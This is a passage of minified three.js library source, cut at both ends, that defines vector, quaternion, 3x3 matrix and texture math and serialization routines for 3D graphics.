this.multiplyScalar(1/t)},applyMatrix3:function(t){var e=this.x,i=this.y;return t=t.elements,this.x=t[0]*e+t[3]*i+t[6],this.y=t[1]*e+t[4]*i+t[7],this},min:function(t){return this.x=Math.min(this.x,t.x),this.y=Math.min(this.y,t.y),this},max:function(t){return this.x=Math.max(this.x,t.x),this.y=Math.max(this.y,t.y),this},clamp:function(t,e){return this.x=Math.max(t.x,Math.min(e.x,this.x)),this.y=Math.max(t.y,Math.min(e.y,this.y)),this},clampScalar:function(t,e){return this.x=Math.max(t,Math.min(e,this.x)),this.y=Math.max(t,Math.min(e,this.y)),this},clampLength:function(t,e){var i=this.length();return this.divideScalar(i||1).multiplyScalar(Math.max(t,Math.min(e,i)))},floor:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this},ceil:function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this},round:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this},roundToZero:function(){return this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x),this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y),this},negate:function(){return this.x=-this.x,this.y=-this.y,this},dot:function(t){return this.x*t.x+this.y*t.y},cross:function(t){return this.x*t.y-this.y*t.x},lengthSq:function(){return this.x*this.x+this.y*this.y},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y)},manhattanLength:function(){return Math.abs(this.x)+Math.abs(this.y)},normalize:function(){return this.divideScalar(this.length()||1)},angle:function(){var t=Math.atan2(this.y,this.x);return 0>t&&(t+=2*Math.PI),t},distanceTo:function(t){return Math.sqrt(this.distanceToSquared(t))},distanceToSquared:function(t){var e=this.x-t.x;return e*e+(t=this.y-t.y)*t},manhattanDistanceTo:function(t){return Math.abs(this.x-t.x)+Math.abs(this.y-t.y)},setLength:function(t){return this.normalize().multiplyScalar(t)},lerp:function(t,e){return this.x+=(t.x-this.x)*e,this.y+=(t.y-this.y)*e,this},lerpVectors:function(t,e,i){return this.subVectors(e,t).multiplyScalar(i).add(t)},equals:function(t){return t.x===this.x&&t.y===this.y},fromArray:function(t,e){return void 0===e&&(e=0),this.x=t[e],this.y=t[e+1],this},toArray:function(t,e){return void 0===t&&(t=[]),void 0===e&&(e=0),t[e]=this.x,t[e+1]=this.y,t},fromBufferAttribute:function(t,e,i){return void 0!==i&&console.warn("THREE.Vector2: offset has been removed from .fromBufferAttribute()."),this.x=t.getX(e),this.y=t.getY(e),this},rotateAround:function(t,e){var i=Math.cos(e);e=Math.sin(e);var n=this.x-t.x,r=this.y-t.y;return this.x=n*i-r*e+t.x,this.y=n*e+r*i+t.y,this}}),Object.assign(n,{slerp:function(t,e,i,n){return i.copy(t).slerp(e,n)},slerpFlat:function(t,e,i,n,r,a,o){var s=i[n+0],l=i[n+1],c=i[n+2];i=i[n+3],n=r[a+0];var h=r[a+1],u=r[a+2];if(i!==(r=r[a+3])||s!==n||l!==h||c!==u){a=1-o;var d=s*n+l*h+c*u+i*r,p=0<=d?1:-1,f=1-d*d;f>Number.EPSILON&&(f=Math.sqrt(f),d=Math.atan2(f,d*p),a=Math.sin(a*d)/f,o=Math.sin(o*d)/f),s=s*a+n*(p*=o),l=l*a+h*p,c=c*a+u*p,i=i*a+r*p,a===1-o&&(s*=o=1/Math.sqrt(s*s+l*l+c*c+i*i),l*=o,c*=o,i*=o)}t[e]=s,t[e+1]=l,t[e+2]=c,t[e+3]=i}}),Object.defineProperties(n.prototype,{x:{get:function(){return this._x},set:function(t){this._x=t,this._onChangeCallback()}},y:{get:function(){return this._y},set:function(t){this._y=t,this._onChangeCallback()}},z:{get:function(){return this._z},set:function(t){this._z=t,this._onChangeCallback()}},w:{get:function(){return this._w},set:function(t){this._w=t,this._onChangeCallback()}}}),Object.assign(n.prototype,{isQuaternion:!0,set:function(t,e,i,n){return this._x=t,this._y=e,this._z=i,this._w=n,this._onChangeCallback(),this},clone:function(){return new this.constructor(this._x,this._y,this._z,this._w)},copy:function(t){return this._x=t.x,this._y=t.y,this._z=t.z,this._w=t.w,this._onChangeCallback(),this},setFromEuler:function(t,e){if(!t||!t.isEuler)throw Error("THREE.Quaternion: .setFromEuler() now expects an Euler rotation rather than a Vector3 and order.");var i=t._x,n=t._y,r=t._z;t=t.order;var a=Math.cos,o=Math.sin,s=a(i/2),l=a(n/2);return a=a(r/2),i=o(i/2),n=o(n/2),r=o(r/2),"XYZ"===t?(this._x=i*l*a+s*n*r,this._y=s*n*a-i*l*r,this._z=s*l*r+i*n*a,this._w=s*l*a-i*n*r):"YXZ"===t?(this._x=i*l*a+s*n*r,this._y=s*n*a-i*l*r,this._z=s*l*r-i*n*a,this._w=s*l*a+i*n*r):"ZXY"===t?(this._x=i*l*a-s*n*r,this._y=s*n*a+i*l*r,this._z=s*l*r+i*n*a,this._w=s*l*a-i*n*r):"ZYX"===t?(this._x=i*l*a-s*n*r,this._y=s*n*a+i*l*r,this._z=s*l*r-i*n*a,this._w=s*l*a+i*n*r):"YZX"===t?(this._x=i*l*a+s*n*r,this._y=s*n*a+i*l*r,this._z=s*l*r-i*n*a,this._w=s*l*a-i*n*r):"XZY"===t&&(this._x=i*l*a-s*n*r,this._y=s*n*a-i*l*r,this._z=s*l*r+i*n*a,this._w=s*l*a+i*n*r),!1!==e&&this._onChangeCallback(),this},setFromAxisAngle:function(t,e){e/=2;var i=Math.sin(e);return this._x=t.x*i,this._y=t.y*i,this._z=t.z*i,this._w=Math.cos(e),this._onChangeCallback(),this},setFromRotationMatrix:function(t){var e=t.elements,i=e[0];t=e[4];var n=e[8],r=e[1],a=e[5],o=e[9],s=e[2],l=e[6],c=i+a+(e=e[10]);return 0<c?(i=.5/Math.sqrt(c+1),this._w=.25/i,this._x=(l-o)*i,this._y=(n-s)*i,this._z=(r-t)*i):i>a&&i>e?(i=2*Math.sqrt(1+i-a-e),this._w=(l-o)/i,this._x=.25*i,this._y=(t+r)/i,this._z=(n+s)/i):a>e?(i=2*Math.sqrt(1+a-i-e),this._w=(n-s)/i,this._x=(t+r)/i,this._y=.25*i,this._z=(o+l)/i):(i=2*Math.sqrt(1+e-i-a),this._w=(r-t)/i,this._x=(n+s)/i,this._y=(o+l)/i,this._z=.25*i),this._onChangeCallback(),this},setFromUnitVectors:function(t,e){var i=t.dot(e)+1;return 1e-6>i?(i=0,Math.abs(t.x)>Math.abs(t.z)?(this._x=-t.y,this._y=t.x,this._z=0):(this._x=0,this._y=-t.z,this._z=t.y)):(this._x=t.y*e.z-t.z*e.y,this._y=t.z*e.x-t.x*e.z,this._z=t.x*e.y-t.y*e.x),this._w=i,this.normalize()},angleTo:function(t){return 2*Math.acos(Math.abs(Ca.clamp(this.dot(t),-1,1)))},rotateTowards:function(t,e){var i=this.angleTo(t);return 0===i||this.slerp(t,Math.min(1,e/i)),this},inverse:function(){return this.conjugate()},conjugate:function(){return this._x*=-1,this._y*=-1,this._z*=-1,this._onChangeCallback(),this},dot:function(t){return this._x*t._x+this._y*t._y+this._z*t._z+this._w*t._w},lengthSq:function(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w},length:function(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)},normalize:function(){var t=this.length();return 0===t?(this._z=this._y=this._x=0,this._w=1):(t=1/t,this._x*=t,this._y*=t,this._z*=t,this._w*=t),this._onChangeCallback(),this},multiply:function(t,e){return void 0!==e?(console.warn("THREE.Quaternion: .multiply() now only accepts one argument. Use .multiplyQuaternions( a, b ) instead."),this.multiplyQuaternions(t,e)):this.multiplyQuaternions(this,t)},premultiply:function(t){return this.multiplyQuaternions(t,this)},multiplyQuaternions:function(t,e){var i=t._x,n=t._y,r=t._z;t=t._w;var a=e._x,o=e._y,s=e._z;return e=e._w,this._x=i*e+t*a+n*s-r*o,this._y=n*e+t*o+r*a-i*s,this._z=r*e+t*s+i*o-n*a,this._w=t*e-i*a-n*o-r*s,this._onChangeCallback(),this},slerp:function(t,e){if(0===e)return this;if(1===e)return this.copy(t);var i=this._x,n=this._y,r=this._z,a=this._w,o=a*t._w+i*t._x+n*t._y+r*t._z;if(0>o?(this._w=-t._w,this._x=-t._x,this._y=-t._y,this._z=-t._z,o=-o):this.copy(t),1<=o)return this._w=a,this._x=i,this._y=n,this._z=r,this;if((t=1-o*o)<=Number.EPSILON)return o=1-e,this._w=o*a+e*this._w,this._x=o*i+e*this._x,this._y=o*n+e*this._y,this._z=o*r+e*this._z,this.normalize(),this._onChangeCallback(),this;t=Math.sqrt(t);var s=Math.atan2(t,o);return o=Math.sin((1-e)*s)/t,e=Math.sin(e*s)/t,this._w=a*o+this._w*e,this._x=i*o+this._x*e,this._y=n*o+this._y*e,this._z=r*o+this._z*e,this._onChangeCallback(),this},equals:function(t){return t._x===this._x&&t._y===this._y&&t._z===this._z&&t._w===this._w},fromArray:function(t,e){return void 0===e&&(e=0),this._x=t[e],this._y=t[e+1],this._z=t[e+2],this._w=t[e+3],this._onChangeCallback(),this},toArray:function(t,e){return void 0===t&&(t=[]),void 0===e&&(e=0),t[e]=this._x,t[e+1]=this._y,t[e+2]=this._z,t[e+3]=this._w,t},_onChange:function(t){return this._onChangeCallback=t,this},_onChangeCallback:function(){}});var Aa=new r,La=new n;Object.assign(r.prototype,{isVector3:!0,set:function(t,e,i){return this.x=t,this.y=e,this.z=i,this},setScalar:function(t){return this.z=this.y=this.x=t,this},setX:function(t){return this.x=t,this},setY:function(t){return this.y=t,this},setZ:function(t){return this.z=t,this},setComponent:function(t,e){switch(t){case 0:this.x=e;break;case 1:this.y=e;break;case 2:this.z=e;break;default:throw Error("index is out of range: "+t)}return this},getComponent:function(t){switch(t){case 0:return this.x;case 1:return this.y;case 2:return this.z;default:throw Error("index is out of range: "+t)}},clone:function(){return new this.constructor(this.x,this.y,this.z)},copy:function(t){return this.x=t.x,this.y=t.y,this.z=t.z,this},add:function(t,e){return void 0!==e?(console.warn("THREE.Vector3: .add() now only accepts one argument. Use .addVectors( a, b ) instead."),this.addVectors(t,e)):(this.x+=t.x,this.y+=t.y,this.z+=t.z,this)},addScalar:function(t){return this.x+=t,this.y+=t,this.z+=t,this},addVectors:function(t,e){return this.x=t.x+e.x,this.y=t.y+e.y,this.z=t.z+e.z,this},addScaledVector:function(t,e){return this.x+=t.x*e,this.y+=t.y*e,this.z+=t.z*e,this},sub:function(t,e){return void 0!==e?(console.warn("THREE.Vector3: .sub() now only accepts one argument. Use .subVectors( a, b ) instead."),this.subVectors(t,e)):(this.x-=t.x,this.y-=t.y,this.z-=t.z,this)},subScalar:function(t){return this.x-=t,this.y-=t,this.z-=t,this},subVectors:function(t,e){return this.x=t.x-e.x,this.y=t.y-e.y,this.z=t.z-e.z,this},multiply:function(t,e){return void 0!==e?(console.warn("THREE.Vector3: .multiply() now only accepts one argument. Use .multiplyVectors( a, b ) instead."),this.multiplyVectors(t,e)):(this.x*=t.x,this.y*=t.y,this.z*=t.z,this)},multiplyScalar:function(t){return this.x*=t,this.y*=t,this.z*=t,this},multiplyVectors:function(t,e){return this.x=t.x*e.x,this.y=t.y*e.y,this.z=t.z*e.z,this},applyEuler:function(t){return t&&t.isEuler||console.error("THREE.Vector3: .applyEuler() now expects an Euler rotation rather than a Vector3 and order."),this.applyQuaternion(La.setFromEuler(t))},applyAxisAngle:function(t,e){return this.applyQuaternion(La.setFromAxisAngle(t,e))},applyMatrix3:function(t){var e=this.x,i=this.y,n=this.z;return t=t.elements,this.x=t[0]*e+t[3]*i+t[6]*n,this.y=t[1]*e+t[4]*i+t[7]*n,this.z=t[2]*e+t[5]*i+t[8]*n,this},applyMatrix4:function(t){var e=this.x,i=this.y,n=this.z,r=1/((t=t.elements)[3]*e+t[7]*i+t[11]*n+t[15]);return this.x=(t[0]*e+t[4]*i+t[8]*n+t[12])*r,this.y=(t[1]*e+t[5]*i+t[9]*n+t[13])*r,this.z=(t[2]*e+t[6]*i+t[10]*n+t[14])*r,this},applyQuaternion:function(t){var e=this.x,i=this.y,n=this.z,r=t.x,a=t.y,o=t.z,s=(t=t.w)*e+a*n-o*i,l=t*i+o*e-r*n,c=t*n+r*i-a*e;return e=-r*e-a*i-o*n,this.x=s*t+e*-r+l*-o-c*-a,this.y=l*t+e*-a+c*-r-s*-o,this.z=c*t+e*-o+s*-a-l*-r,this},project:function(t){return this.applyMatrix4(t.matrixWorldInverse).applyMatrix4(t.projectionMatrix)},unproject:function(t){return this.applyMatrix4(t.projectionMatrixInverse).applyMatrix4(t.matrixWorld)},transformDirection:function(t){var e=this.x,i=this.y,n=this.z;return t=t.elements,this.x=t[0]*e+t[4]*i+t[8]*n,this.y=t[1]*e+t[5]*i+t[9]*n,this.z=t[2]*e+t[6]*i+t[10]*n,this.normalize()},divide:function(t){return this.x/=t.x,this.y/=t.y,this.z/=t.z,this},divideScalar:function(t){return this.multiplyScalar(1/t)},min:function(t){return this.x=Math.min(this.x,t.x),this.y=Math.min(this.y,t.y),this.z=Math.min(this.z,t.z),this},max:function(t){return this.x=Math.max(this.x,t.x),this.y=Math.max(this.y,t.y),this.z=Math.max(this.z,t.z),this},clamp:function(t,e){return this.x=Math.max(t.x,Math.min(e.x,this.x)),this.y=Math.max(t.y,Math.min(e.y,this.y)),this.z=Math.max(t.z,Math.min(e.z,this.z)),this},clampScalar:function(t,e){return this.x=Math.max(t,Math.min(e,this.x)),this.y=Math.max(t,Math.min(e,this.y)),this.z=Math.max(t,Math.min(e,this.z)),this},clampLength:function(t,e){var i=this.length();return this.divideScalar(i||1).multiplyScalar(Math.max(t,Math.min(e,i)))},floor:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this},ceil:function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this},round:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this},roundToZero:function(){return this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x),this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y),this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z),this},negate:function(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this},dot:function(t){return this.x*t.x+this.y*t.y+this.z*t.z},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)},manhattanLength:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)},normalize:function(){return this.divideScalar(this.length()||1)},setLength:function(t){return this.normalize().multiplyScalar(t)},lerp:function(t,e){return this.x+=(t.x-this.x)*e,this.y+=(t.y-this.y)*e,this.z+=(t.z-this.z)*e,this},lerpVectors:function(t,e,i){return this.subVectors(e,t).multiplyScalar(i).add(t)},cross:function(t,e){return void 0!==e?(console.warn("THREE.Vector3: .cross() now only accepts one argument. Use .crossVectors( a, b ) instead."),this.crossVectors(t,e)):this.crossVectors(this,t)},crossVectors:function(t,e){var i=t.x,n=t.y;t=t.z;var r=e.x,a=e.y;return e=e.z,this.x=n*e-t*a,this.y=t*r-i*e,this.z=i*a-n*r,this},projectOnVector:function(t){var e=t.dot(this)/t.lengthSq();return this.copy(t).multiplyScalar(e)},projectOnPlane:function(t){return Aa.copy(this).projectOnVector(t),this.sub(Aa)},reflect:function(t){return this.sub(Aa.copy(t).multiplyScalar(2*this.dot(t)))},angleTo:function(t){return t=this.dot(t)/Math.sqrt(this.lengthSq()*t.lengthSq()),Math.acos(Ca.clamp(t,-1,1))},distanceTo:function(t){return Math.sqrt(this.distanceToSquared(t))},distanceToSquared:function(t){var e=this.x-t.x,i=this.y-t.y;return e*e+i*i+(t=this.z-t.z)*t},manhattanDistanceTo:function(t){return Math.abs(this.x-t.x)+Math.abs(this.y-t.y)+Math.abs(this.z-t.z)},setFromSpherical:function(t){return this.setFromSphericalCoords(t.radius,t.phi,t.theta)},setFromSphericalCoords:function(t,e,i){var n=Math.sin(e)*t;return this.x=n*Math.sin(i),this.y=Math.cos(e)*t,this.z=n*Math.cos(i),this},setFromCylindrical:function(t){return this.setFromCylindricalCoords(t.radius,t.theta,t.y)},setFromCylindricalCoords:function(t,e,i){return this.x=t*Math.sin(e),this.y=i,this.z=t*Math.cos(e),this},setFromMatrixPosition:function(t){return t=t.elements,this.x=t[12],this.y=t[13],this.z=t[14],this},setFromMatrixScale:function(t){var e=this.setFromMatrixColumn(t,0).length(),i=this.setFromMatrixColumn(t,1).length();return t=this.setFromMatrixColumn(t,2).length(),this.x=e,this.y=i,this.z=t,this},setFromMatrixColumn:function(t,e){return this.fromArray(t.elements,4*e)},equals:function(t){return t.x===this.x&&t.y===this.y&&t.z===this.z},fromArray:function(t,e){return void 0===e&&(e=0),this.x=t[e],this.y=t[e+1],this.z=t[e+2],this},toArray:function(t,e){return void 0===t&&(t=[]),void 0===e&&(e=0),t[e]=this.x,t[e+1]=this.y,t[e+2]=this.z,t},fromBufferAttribute:function(t,e,i){return void 0!==i&&console.warn("THREE.Vector3: offset has been removed from .fromBufferAttribute()."),this.x=t.getX(e),this.y=t.getY(e),this.z=t.getZ(e),this}});var Pa=new r;Object.assign(a.prototype,{isMatrix3:!0,set:function(t,e,i,n,r,a,o,s,l){var c=this.elements;return c[0]=t,c[1]=n,c[2]=o,c[3]=e,c[4]=r,c[5]=s,c[6]=i,c[7]=a,c[8]=l,this},identity:function(){return this.set(1,0,0,0,1,0,0,0,1),this},clone:function(){return(new this.constructor).fromArray(this.elements)},copy:function(t){var e=this.elements;return t=t.elements,e[0]=t[0],e[1]=t[1],e[2]=t[2],e[3]=t[3],e[4]=t[4],e[5]=t[5],e[6]=t[6],e[7]=t[7],e[8]=t[8],this},setFromMatrix4:function(t){return t=t.elements,this.set(t[0],t[4],t[8],t[1],t[5],t[9],t[2],t[6],t[10]),this},applyToBufferAttribute:function(t){for(var e=0,i=t.count;e<i;e++)Pa.x=t.getX(e),Pa.y=t.getY(e),Pa.z=t.getZ(e),Pa.applyMatrix3(this),t.setXYZ(e,Pa.x,Pa.y,Pa.z);return t},multiply:function(t){return this.multiplyMatrices(this,t)},premultiply:function(t){return this.multiplyMatrices(t,this)},multiplyMatrices:function(t,e){var i=t.elements,n=e.elements;e=this.elements,t=i[0];var r=i[3],a=i[6],o=i[1],s=i[4],l=i[7],c=i[2],h=i[5];i=i[8];var u=n[0],d=n[3],p=n[6],f=n[1],m=n[4],g=n[7],v=n[2],y=n[5];return n=n[8],e[0]=t*u+r*f+a*v,e[3]=t*d+r*m+a*y,e[6]=t*p+r*g+a*n,e[1]=o*u+s*f+l*v,e[4]=o*d+s*m+l*y,e[7]=o*p+s*g+l*n,e[2]=c*u+h*f+i*v,e[5]=c*d+h*m+i*y,e[8]=c*p+h*g+i*n,this},multiplyScalar:function(t){var e=this.elements;return e[0]*=t,e[3]*=t,e[6]*=t,e[1]*=t,e[4]*=t,e[7]*=t,e[2]*=t,e[5]*=t,e[8]*=t,this},determinant:function(){var t=this.elements,e=t[0],i=t[1],n=t[2],r=t[3],a=t[4],o=t[5],s=t[6],l=t[7];return e*a*(t=t[8])-e*o*l-i*r*t+i*o*s+n*r*l-n*a*s},getInverse:function(t,e){t&&t.isMatrix4&&console.error("THREE.Matrix3: .getInverse() no longer takes a Matrix4 argument.");var i=t.elements;t=this.elements;var n=i[0],r=i[1],a=i[2],o=i[3],s=i[4],l=i[5],c=i[6],h=i[7],u=(i=i[8])*s-l*h,d=l*c-i*o,p=h*o-s*c,f=n*u+r*d+a*p;if(0===f){if(!0===e)throw Error("THREE.Matrix3: .getInverse() can't invert matrix, determinant is 0");return console.warn("THREE.Matrix3: .getInverse() can't invert matrix, determinant is 0"),this.identity()}return e=1/f,t[0]=u*e,t[1]=(a*h-i*r)*e,t[2]=(l*r-a*s)*e,t[3]=d*e,t[4]=(i*n-a*c)*e,t[5]=(a*o-l*n)*e,t[6]=p*e,t[7]=(r*c-h*n)*e,t[8]=(s*n-r*o)*e,this},transpose:function(){var t=this.elements,e=t[1];return t[1]=t[3],t[3]=e,e=t[2],t[2]=t[6],t[6]=e,e=t[5],t[5]=t[7],t[7]=e,this},getNormalMatrix:function(t){return this.setFromMatrix4(t).getInverse(this).transpose()},transposeIntoArray:function(t){var e=this.elements;return t[0]=e[0],t[1]=e[3],t[2]=e[6],t[3]=e[1],t[4]=e[4],t[5]=e[7],t[6]=e[2],t[7]=e[5],t[8]=e[8],this},setUvTransform:function(t,e,i,n,r,a,o){var s=Math.cos(r);r=Math.sin(r),this.set(i*s,i*r,-i*(s*a+r*o)+a+t,-n*r,n*s,-n*(-r*a+s*o)+o+e,0,0,1)},scale:function(t,e){var i=this.elements;return i[0]*=t,i[3]*=t,i[6]*=t,i[1]*=e,i[4]*=e,i[7]*=e,this},rotate:function(t){var e=Math.cos(t);t=Math.sin(t);var i=this.elements,n=i[0],r=i[3],a=i[6],o=i[1],s=i[4],l=i[7];return i[0]=e*n+t*o,i[3]=e*r+t*s,i[6]=e*a+t*l,i[1]=-t*n+e*o,i[4]=-t*r+e*s,i[7]=-t*a+e*l,this},translate:function(t,e){var i=this.elements;return i[0]+=t*i[2],i[3]+=t*i[5],i[6]+=t*i[8],i[1]+=e*i[2],i[4]+=e*i[5],i[7]+=e*i[8],this},equals:function(t){var e=this.elements;t=t.elements;for(var i=0;9>i;i++)if(e[i]!==t[i])return!1;return!0},fromArray:function(t,e){void 0===e&&(e=0);for(var i=0;9>i;i++)this.elements[i]=t[i+e];return this},toArray:function(t,e){void 0===t&&(t=[]),void 0===e&&(e=0);var i=this.elements;return t[e]=i[0],t[e+1]=i[1],t[e+2]=i[2],t[e+3]=i[3],t[e+4]=i[4],t[e+5]=i[5],t[e+6]=i[6],t[e+7]=i[7],t[e+8]=i[8],t}});var Ra,Oa={getDataURL:function(t){if("undefined"==typeof HTMLCanvasElement)return t.src;if(!(t instanceof HTMLCanvasElement)){void 0===Ra&&(Ra=document.createElementNS("http://www.w3.org/1999/xhtml","canvas")),Ra.width=t.width,Ra.height=t.height;var e=Ra.getContext("2d");t instanceof ImageData?e.putImageData(t,0,0):e.drawImage(t,0,0,t.width,t.height),t=Ra}return 2048<t.width||2048<t.height?t.toDataURL("image/jpeg",.6):t.toDataURL("image/png")}},Ia=0;o.DEFAULT_IMAGE=void 0,o.DEFAULT_MAPPING=300,o.prototype=Object.assign(Object.create(e.prototype),{constructor:o,isTexture:!0,updateMatrix:function(){this.matrix.setUvTransform(this.offset.x,this.offset.y,this.repeat.x,this.repeat.y,this.rotation,this.center.x,this.center.y)},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.name=t.name,this.image=t.image,this.mipmaps=t.mipmaps.slice(0),this.mapping=t.mapping,this.wrapS=t.wrapS,this.wrapT=t.wrapT,this.magFilter=t.magFilter,this.minFilter=t.minFilter,this.anisotropy=t.anisotropy,this.format=t.format,this.type=t.type,this.offset.copy(t.offset),this.repeat.copy(t.repeat),this.center.copy(t.center),this.rotation=t.rotation,this.matrixAutoUpdate=t.matrixAutoUpdate,this.matrix.copy(t.matrix),this.generateMipmaps=t.generateMipmaps,this.premultiplyAlpha=t.premultiplyAlpha,this.flipY=t.flipY,this.unpackAlignment=t.unpackAlignment,this.encoding=t.encoding,this},toJSON:function(t){var e=void 0===t||"string"==typeof t;if(!e&&void 0!==t.textures[this.uuid])return t.textures[this.uuid];var i={metadata:{version:4.5,type:"Texture",generator:"Texture.toJSON"},uuid:this.uuid,name:this.name,mapping:this.mapping,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,this.offset.y],center:[this.center.x,this.center.y],rotation:this.rotation,wrap:[this.wrapS,this.wrapT],format:this.format,type:this.type,encoding:this.encoding,minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy,flipY:this.flipY,premultiplyAlpha:this.premultiplyAlpha,unpackAlignment:this.unpackAlignment};if(void 0!==this.image){var n=this.image;if(void 0===n.uuid&&(n.uuid=Ca.generateUUID()),!e&&void 0===t.images[n.uuid]){if(Array.isArray(n))for(var r=[],a=0,o=n.length;a<o;a++)r.push(Oa.getDataURL(n[a]));else r=Oa.getDataURL(n);t.images[n.uuid]={uuid:n.uuid,url:r}}i.image=n.uuid}return e||(t.textures[this.uuid]=i),i},dispose:function(){this.dispatchEvent({type:"dispose"})},transformUv:function(t){if(300!==this.mapping)return t;if(t.applyMatrix3(this.matrix),0>t.x||1<t.x)switch(this.wrapS){case 1e3:t.x-=Math.floor(t.x);break;case 1001:t.x=0>t.x?0:1;break;case 1002:t.x=1===Math.abs(Math.floor(t.x)%2)?Math.ceil(t.x)-t.x:t.x-Math.floor(t.x)}if(0>t.y||1<t.y)switch(this.wrapT){case 1e3:t.y-=Math.floor(t.y);break;case 1001:t.y=0>t.y?0:1;break;case 1002:t.y=1===Math.abs(Math.floor(t.y)%2)?Math.ceil(t.y)-t.y:t.y-Math.floor(t.y)}return this.flipY&&(t.y=1-t.y),t}}),Object.defineProperty(o.prototype,"needsUpdate",{set:function(t){!0===t&&this.version++}}),Object.defineProperties(s.prototype,{width:{get:function(){return this.z},set:function(t){this.z=t}},height:{get:function(){return this.w},set:function(t){this.w=t}}}),Object.assign(s.prototype,{isVector4:!0,set:function(t,e,i,n){return this.x=t,this.y=e,this.z=i,this.w=n,this},setScalar:function(t){return this.w=this.z=this.y=this.x=t,this},setX:function(t){return this.x=t,this},setY:function(t){return this.y=t,this},setZ:function(t){return this.z=t,this},setW:function(t){return this.w=t,this},setComponent:function(t,e){switch(t){case 0:this.x=e;break;case 1:this.y=e;break;case 2:this.z=e;break;case 3:this.w=e;break;default:throw Error("index is out of range: "+t)}return this},getComponent:function(t){switch(t){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw Error("index is out of range: "+t)}},clone:function(){return new this.constructor(this.x,this.y,this.z,this.w)},copy:function(t){return this.x=t.x,this.y=t.y,this.z=t.z,this.w=void 0!==t.w?t.w:1,this},add:function(t,e){return void 0!==e?(console.warn("THREE.Vector4: .add() now only accepts one argument. Use .addVectors( a, b ) instead."),this.addVectors(t,e)):(this.x+=t.x,this.y+=t.y,this.z+=t.z,this.w+=t.w,this)},addScalar:function(t){return this.x+=t,this.y+=t,this.z+=t,this.w+=t,this},addVectors:function(t,e){return this.x=t.x+e.x,this.y=t.y+e.y,this.z=t.z+e.z,this.w=t.w+e.w,this},addScaledVector:function(t,e){return this.x+=t.x*e,this.y+=t.y*e,this.z+=t.z*e,this.w+=t.w*e,this},sub:function(t,e){return void 0!==e?(console.warn("THREE.Vector4: .sub() now only accepts one argument. Use .subVectors( a, b ) instead."),this.subVectors(t,e)):(this.x-=t.x,this.y-=t.y,this.z-=t.z,this.w-=t.w,this)},subScalar:function(t){return this.x-=t,this.y-=t,this.z-=t,this.w-=t,this},subVectors:function(t,e){return this.x=t.x-e.x,this.y=t.y-e.y,this.z=t.z-e.z,this.w=t.w-e.w,this},multiplyScalar:function(t){return this.x*=t,this.y*=t,this.z*=t,this.w*=t,this},applyMatrix4:function(t){var e=this.x,i=this.y,n=this.z,r=this.w;return t=t.elements,this.x=t[0]*e+t[4]*i+t[8]*n+t[12]*r,this.y=t[1]*e+t[5]*i+t[9]*n+t[13]*r,this.z=t[2]*e+t[6]*i+t[10]*n+t[14]*r,this.w=t[3]*e+t[7]*i+t[11]*n+t[15]*r,this},divideScalar:function(t){return this.multiplyScalar(1/t)},setAxisAngleFromQuaternion:function(t){this.w=2*Math.acos(t.w);var e=Math.sqrt(1-t.w*t.w);return 1e-4>e?(this.x=1,this.z=this.y=0):(this.x=t.x/e,this.y=t.y/e,this.z=t.z/e),this},setAxisAngleFromRotationMatrix:function(t){var e=(t=t.elements)[0],i=t[4],n=t[8],r=t[1],a=t[5],o=t[9],s=t[2],l=t[6],c=t[10];return.01>Math.abs(i-r)&&.01>Math.abs(n-s)&&.01>Math.abs(o-l)?.1>Math.abs(i+r)&&.1>Math.abs(n+s)&&.1>Math.abs(o+l)&&.1>Math.abs(e+a+c-3)?(this.set(1,0,0,0),this):(t=Math.PI,c=(c+1)/2,i=(i+r)/4,n=(n+s)/4,o=(o+l)/4,(e=(e+1)/2)>(a=(a+1)/2)&&e>c?.01>e?(l=0,i=s=.707106781):(s=i/(l=Math.sqrt(e)),i=n/l):a>c?.01>a?(l=.707106781,s=0,i=.707106781):(l=i/(s=Math.sqrt(a)),i=o/s):.01>c?(s=l=.707106781,i=0):(l=n/(i=Math.sqrt(c)),s=o/i),this.set(l,s,i,t),this):(t=Math.sqrt((l-o)*(l-o)+(n-s)*(n-s)+(r-i)*(r-i)),.001>Math.abs(t)&&(t=1),this.x=(l-o)/t,this.y=(n-s)/t,this.z=(r-i)/t,this.w=Math.acos((e+a+c-1)/2),this)},min:function(t){return this.x=Math.min(this.x,t.x),this.y=Math.min(this.y,t.y),this.z=Math.min(this.z,t.z),this.w=Math.min(this.w,t.w),this},max:function(t){return this.x=Math.max(this.x,t.x),this.y=Math.max(this.y,t.y),this.z=Math.max(this.z,t.z),this.w=Math.max(this.w,t.w),this},clamp:function(t,e){return this.x=Math.max(t.x,Math.min(e.x,this.x)),this.y=Math.max(t.y,Math.min(e.y,this.y)),this.z=Math.max(t.z,Math.min(e.z,this.z)),this.w=Math.max(t.w,Math.min(e.w,this.w)),this},clampScalar:function(t,e){return this.x=Math.max(t,Math.min(e,this.x)),this.y=Math.max(t,Math.min(e,this.y)),this.z=Math.max(t,Math.min(e,this.z)),this.w=Math.max(t,Math.min(e,this.w)),this},clampLength:function(t,e){var i=this.length();return this.divideScalar(i||1).multiplyScalar(Math.max(t,Math.min(e,i)))},floor:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this.w=Math.floor(this.w),this},ceil:function(){return 